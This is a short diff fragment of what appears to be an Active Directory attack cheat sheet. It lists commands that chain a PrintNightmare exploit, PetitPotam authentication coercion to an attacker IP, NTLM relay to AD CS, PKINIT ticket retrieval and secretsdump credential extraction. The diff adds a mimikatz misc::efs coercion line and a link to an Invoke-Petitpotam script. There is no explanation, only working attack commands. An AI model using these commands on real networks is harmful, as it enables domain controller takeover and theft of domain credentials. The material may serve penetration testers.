@@ -1000,6 +1000,8 @@ $ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<
 https://github.com/topotam/PetitPotam
 $ sudo ntlmrelayx.py -debug -smb2support --target http://<hostname>/certsrv/certfnsh.asp --adcs --template DomainController
 $ python3 PetitPotam.py <Attacker IP address> <Domain Controller IP address>
+mimikatz # misc::efs /server:<Domain Controller IP address> /connect:<Attacker IP address>
+https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1
 $ python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<machine account>\$ -pfx-base64 <base64 certificate> = dc01.ccache
 $ secretsdump.py -just-dc-user <domain>/<username> -k -no-pass "<machine account>$"@<hostname>
 $ klist
